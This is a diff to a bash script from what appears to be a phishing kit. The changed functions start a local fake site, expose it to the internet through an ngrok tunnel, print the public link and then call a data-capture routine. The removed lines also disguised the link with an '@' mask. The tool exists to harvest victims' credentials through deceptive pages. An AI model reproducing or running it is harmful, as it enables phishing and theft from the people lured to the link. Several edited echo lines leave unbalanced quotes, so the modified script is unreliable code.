@@ -174,38 +174,34 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	echo -e $red READING PLEASE WAIT....... $red http://$HOST:$PORT
+	  sleep 1; setup_site; 
+	echo -e $red NGROK LAUNCHING UP........
 
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     else
         sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
 
-	{ sleep 8; clear; banner_small; }
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")	
+	echo -e $red  URL  : $red $ngrok_url"
 	capture_data
 }
 
 ## Start localhost
 start_localhost() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e $red READING SERVER... $red http://$HOST:$PORT"
 	setup_site
-	{ sleep 1; clear; banner_small; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+	echo -e $red Successfully Host : $red http://$HOST:$PORT $red"
 	capture_data
 }
 
 ### Tunnel selection
 tunnel_menu() {
 
-echo -e $red  	     Localhost
-echo -e $red         Ngrok
+echo -e $red "[01]   >	  Localhost"
+echo -e $red "[02]   >    Ngrok"
 
 	EOF
 
